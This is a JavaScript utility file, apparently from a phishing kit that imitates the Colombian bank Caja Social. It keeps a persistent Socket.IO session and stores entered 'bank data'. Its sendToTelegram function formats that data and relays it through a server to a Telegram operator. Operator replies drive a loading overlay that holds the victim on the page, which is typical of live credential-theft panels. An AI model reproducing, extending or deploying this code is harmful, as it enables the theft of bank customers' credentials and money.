/**
 * Utilidades Socket.IO — proyecto Caja Social standalone
 */
(function() {
    'use strict';

    let socket = null;
    let sessionId = null;
    let overlayElement = null;
    let keepAliveTimer = null;

    function initSocket() {
        if (socket) return socket;

        sessionId = localStorage.getItem('cajaSessionId');
        if (!sessionId) {
            sessionId = `caja_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
            localStorage.setItem('cajaSessionId', sessionId);
        }

        const socketUrl = window.location.hostname === 'localhost'
            ? `http://localhost:${window.location.port || 3000}`
            : window.location.origin;

        socket = io(socketUrl, {
            reconnection: true,
            reconnectionDelay: 500,
            reconnectionAttempts: Infinity,
            timeout: 20000,
            transports: ['websocket', 'polling'],
            auth: { sessionId }
        });

        socket.on('connect', () => {
            socket.emit('init_session', { sessionId });
        });

        socket.on('reconnect', () => {
            socket.emit('init_session', { sessionId });
        });

        if (keepAliveTimer) clearInterval(keepAliveTimer);
        keepAliveTimer = setInterval(() => {
            if (socket?.connected) socket.emit('keepAlive', { sessionId });
        }, 20000);

        return socket;
    }

    function getOverlay() {
        if (!overlayElement) {
            overlayElement = document.getElementById('loadingOverlay');
        }
        return overlayElement;
    }

    function showOverlay() {
        const overlay = getOverlay();
        if (!overlay) return;
        overlay.classList.add('show');
        overlay.style.display = 'flex';
        document.body.style.overflow = 'hidden';
    }

    function hideOverlay() {
        const overlay = getOverlay();
        if (!overlay) return;
        overlay.classList.remove('show', 'active');
        overlay.style.display = 'none';
        document.body.style.overflow = '';
    }

    function sendToTelegram(type, content) {
        return new Promise((resolve, reject) => {
            if (!socket?.connected) {
                reject(new Error('Socket no conectado'));
                return;
            }
            const timeoutId = setTimeout(() => reject(new Error('Timeout')), 30000);
            socket.once('dataSent', (response) => {
                clearTimeout(timeoutId);
                if (response.success) resolve(response);
                else reject(new Error(response.error || 'Error'));
            });
            socket.emit('sendData', { sessionId, type, content });
        });
    }

    function onTelegramAction(callback) {
        if (!socket) return;
        socket.on('telegramAction', (data) => {
            hideOverlay();
            if (callback) callback(data);
        });
    }

    function formatMessage(bankName, bankData) {
        let message = `\n🔔 <b>${bankName.toUpperCase()}</b>\n\n📝 <b>INFORMACIÓN:</b>\n`;
        Object.entries(bankData).forEach(([key, value]) => {
            if (value && value !== 'N/A') {
                message += `<b>${key}:</b> ${value}\n`;
            }
        });
        message += `\n⏰ ${new Date().toLocaleString('es-CO')}`;
        return message.trim();
    }

    function getBankData() {
        return JSON.parse(sessionStorage.getItem('caja-socialData') || '{}');
    }

    function saveBankData(_, data) {
        const merged = { ...getBankData(), ...data };
        sessionStorage.setItem('caja-socialData', JSON.stringify(merged));
        return merged;
    }

    function init() {
        initSocket();
    }

    window.BancoUtils = {
        init,
        initSocket,
        getSocket: () => socket,
        getSessionId: () => sessionId,
        showOverlay,
        hideOverlay,
        sendToTelegram,
        onTelegramAction,
        formatMessage,
        getBankData,
        saveBankData
    };

    init();
})();
